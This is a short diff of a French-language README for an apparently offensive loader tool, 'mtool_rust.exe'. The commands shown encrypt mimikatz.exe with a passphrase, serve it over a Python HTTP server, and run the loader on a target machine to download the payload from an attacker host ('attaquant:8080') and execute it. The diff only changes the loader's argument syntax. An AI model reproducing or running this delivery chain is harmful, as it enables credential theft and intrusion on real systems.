@@ -16,7 +16,7 @@ python encrypt.py C:\tools\mimikatz.exe "Hollow3r!2026" -o payload
 cd payload && python -m http.server 8080
 
 # Exécuter sur la cible
-.\build\mtool_rust.exe http://<IP>:8080/mimikatz.bin "Hollow3r!2026"
+.\build\mtool_rust.exe <IP> 8080 /mimikatz.bin "Hollow3r!2026"
 ```
 
 ---
@@ -24,7 +24,7 @@ cd payload && python -m http.server 8080
 ## Comment ça marche
 
 ```
-.\build\mtool_rust.exe http://attaquant:8080/payload.bin "passphrase" [args...]
+.\build\mtool_rust.exe <host> <port> <path> "passphrase" [-- args...]
        │
        ├─ Thread secondaire créé
        │        │
